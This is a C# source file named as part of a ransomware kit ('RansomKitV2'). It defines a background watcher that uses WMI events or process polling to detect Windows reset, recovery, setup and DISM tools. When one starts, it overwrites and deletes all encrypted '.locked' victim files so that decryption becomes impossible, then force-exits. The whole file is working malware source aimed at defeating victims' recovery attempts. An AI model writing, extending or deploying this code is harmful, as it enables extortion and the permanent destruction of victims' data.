using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Management;
using System.Threading;

namespace RansomKitV2
{
    // ══════════════════════════════════════════════════════════════
    //  ResetWatcher
    //
    //  Runs on a background daemon thread.
    //  If it detects any process that is part of Windows
    //  Reset / Recovery / Reinstall, it:
    //    1. Zero-overwrites then deletes every .locked file
    //    2. Forcefully exits the process
    //
    //  Strategy A — WMI __InstanceCreationEvent (preferred, low overhead)
    //  Strategy B — polling GetProcesses()     (fallback if WMI unavailable)
    // ══════════════════════════════════════════════════════════════

    static class ResetWatcher
    {
        // Process names that indicate a reset/recovery attempt
        static readonly HashSet<string> Triggers = new(StringComparer.OrdinalIgnoreCase)
        {
            // Windows Reset / Recovery
            "SystemReset.exe",
            "ResetEngine.exe",
            "srtasks.exe",           // System Restore / Recovery tasks
            "RecoveryDrive.exe",
            "WindowsREAgent.exe",
            "reagentc.exe",          // WinRE configuration tool

            // Installation / refresh
            "setup.exe",             // Windows Setup (upgrade / reinstall)
            "SetupHost.exe",
            "SetupPrep.exe",
            "MediaCreationTool.exe",

            // WinPE / DISM in recovery context
            "dism.exe",
            "Dism.exe",

            // Factory reset tooling
            "PushButtonReset.exe",
        };

        static List<string>            _lockedFiles = new();
        static ManagementEventWatcher? _wmiWatcher;

        // ── Public entry point ────────────────────────────────────

        /// <summary>
        /// Start watching in the background.
        /// <paramref name="lockedFiles"/> is the list of .locked paths to nuke if triggered.
        /// </summary>
        public static void Start(List<string> lockedFiles)
        {
            _lockedFiles = lockedFiles;

            var t = new Thread(WatchMain)
            {
                IsBackground = true,
                Priority     = ThreadPriority.AboveNormal,
                Name         = "ResetGuard"
            };
            t.Start();
        }

        // ── Thread entry ──────────────────────────────────────────

        static void WatchMain()
        {
            try
            {
                StartWmiSubscription();
                // WMI callback handles the rest; keep thread alive
                Thread.Sleep(Timeout.Infinite);
            }
            catch
            {
                // WMI unavailable — fall back to polling
                PollLoop();
            }
        }

        static void StartWmiSubscription()
        {
            // Fires within 1 second of any new process creation
            var query = new WqlEventQuery(
                "SELECT * FROM __InstanceCreationEvent WITHIN 1 " +
                "WHERE TargetInstance ISA 'Win32_Process'");

            _wmiWatcher = new ManagementEventWatcher(query);
            _wmiWatcher.EventArrived += OnProcessStarted;
            _wmiWatcher.Start();
        }

        static void OnProcessStarted(object sender, EventArrivedEventArgs e)
        {
            try
            {
                var proc = (ManagementBaseObject)e.NewEvent["TargetInstance"];
                string name = proc["Name"]?.ToString() ?? "";

                if (Triggers.Contains(name))
                    NukeAndExit("WMI detected reset process: " + name);
            }
            catch { }
        }

        // ── Polling fallback (runs if WMI subscription fails) ─────

        static void PollLoop()
        {
            while (true)
            {
                try
                {
                    foreach (var p in Process.GetProcesses())
                    {
                        try
                        {
                            // GetProcesses() returns name without .exe
                            string check = p.ProcessName + ".exe";
                            if (Triggers.Contains(check))
                            {
                                NukeAndExit("Polling detected reset process: " + check);
                                return;
                            }
                        }
                        catch { }
                        finally
                        {
                            try { p.Dispose(); } catch { }
                        }
                    }
                }
                catch { }

                Thread.Sleep(1_500);  // check every 1.5 seconds
            }
        }

        // ── Nuclear option ────────────────────────────────────────

        static void NukeAndExit(string reason)
        {
            // Stop the WMI watcher so we don't re-enter
            try { _wmiWatcher?.Stop(); } catch { }

            // Wipe every .locked file — makes decryption impossible
            CryptoEngine.NukeLockedFiles(_lockedFiles);

            // Hard exit — no cleanup, no managed shutdown
            Environment.FailFast("Reset guard triggered: " + reason);
        }
    }
}
